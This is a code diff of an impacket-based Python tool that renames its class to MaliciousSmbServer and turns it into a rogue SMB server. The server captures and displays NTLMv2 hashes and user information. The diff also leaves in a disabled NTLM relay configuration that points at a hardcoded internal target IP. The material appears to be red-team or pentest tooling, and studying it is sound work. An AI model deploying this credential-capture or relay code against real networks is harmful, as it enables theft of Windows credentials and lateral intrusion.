@@ -4,7 +4,7 @@ from impacket import smbserver
 from io import StringIO
 import logging
 import sys
-
+from loguru import logger
 from scapy.utils import colgen
 from binascii import hexlify
 from .interceptlogging import InterceptHandler
@@ -13,8 +13,10 @@ import re
 from colorama import Fore, Style
 from tabulate import tabulate
 
+from impacket.examples.logger import init
 
-class SmbServer:
+
+class MaliciousSmbServer:
     """[ Class that contains the configuration for the smbserver ]
 
     Args:
@@ -23,10 +25,9 @@ class SmbServer:
         output ([type], optional): [ Output of the information collected ]. Defaults to sys.stdout.
     """
 
-    def __init__(self, lhost: str, port: str, output=sys.stdout) -> None:
+    def __init__(self, lhost: str, port: str) -> None:
         self._lhost = lhost
         self._port = port
-        self._output = output
 
         self.myserver = None
 
@@ -54,10 +55,6 @@ class SmbServer:
     def port(self) -> str:
         return self._port
 
-    @property
-    def output(self):
-        return self._output
-
     @lhost.setter
     def iface(self, lhost: str) -> None:
         self._lhost = lhost
@@ -65,10 +62,6 @@ class SmbServer:
     @port.setter
     def port(self, port: str) -> None:
         self._port = port
-
-    @output.setter
-    def output(self, output) -> None:
-        self._output = output
 
     @log_stream.setter
     def log_stream(self, stream: StringIO) -> None:
@@ -78,10 +71,11 @@ class SmbServer:
         """[Function to redirect the output of the class from impacket
         smbserver to loguru and log_stream]
         """
+        # init(False)
         logging.basicConfig(handlers=[InterceptHandler()], level=0)
-        console = logging.StreamHandler(self.log_stream)
-        console.setLevel(logging.INFO)
-        logging.getLogger("").addHandler(console)
+        # console = logging.StreamHandler(self.log_stream)
+        # console.setLevel(logging.INFO)
+        # logging.getLogger("").addHandler(InterceptHandler())
 
     def user_info(self, i: int, user_info_matches: str) -> Tuple[str, str]:
         """[ Function to take interesting information about the user ]
@@ -227,22 +221,36 @@ class SmbServer:
 
     def start_smbserver(self) -> None:
         """[ Function to start the smb server ]"""
+
+        show_ntlmv2_thread = Thread(target=self.show_ntlmv2)
+        show_ntlmv2_thread.daemon = True
+        show_ntlmv2_thread.start()
+
+        more_info_thread = Thread(target=self.show_server_info)
+        more_info_thread.daemon = True
+        more_info_thread.start()
+
+        self.myserver = smbserver.SimpleSMBServer(
+            listenAddress=self.lhost, listenPort=int(self.port)
+        )
+        self.myserver.setSMBChallenge("")
+        self.myserver.start()
+
+    """
         import logging
         from impacket.examples.ntlmrelayx.servers.smbrelayserver import SMBRelayServer
         from impacket.examples.ntlmrelayx.clients.smbrelayclient import SMBRelayClient
         from impacket.examples.ntlmrelayx.attacks.smbattack import SMBAttack
         from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig
         from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
-        from impacket.examples.logger import init
 
-        init(False)
+        # init(False)
         Ataques = {"SMB": SMBAttack}
         Clientes = {"SMB": SMBRelayClient}
         target = TargetsProcessor(
             singleTarget="192.168.253.130",
             protocolClients=Clientes,
         )
-
         config = NTLMRelayxConfig()
         config.setMode("RELAY")
         config.target = target
@@ -254,19 +262,4 @@ class SmbServer:
         server.start()
         server.join()
         print("hola")
-
-        """
-        show_ntlmv2_thread = Thread(target=self.show_ntlmv2)
-        show_ntlmv2_thread.daemon = True
-        show_ntlmv2_thread.start()
-
-        more_info_thread = Thread(target=self.show_server_info)
-        more_info_thread.daemon = True
-        more_info_thread.start()
-        
-        self.myserver = smbserver.SimpleSMBServer(
-            listenAddress=self.lhost, listenPort=int(self.port)
-        )
-        self.myserver.setSMBChallenge("")
-        self.myserver.start()
-        """
+"""
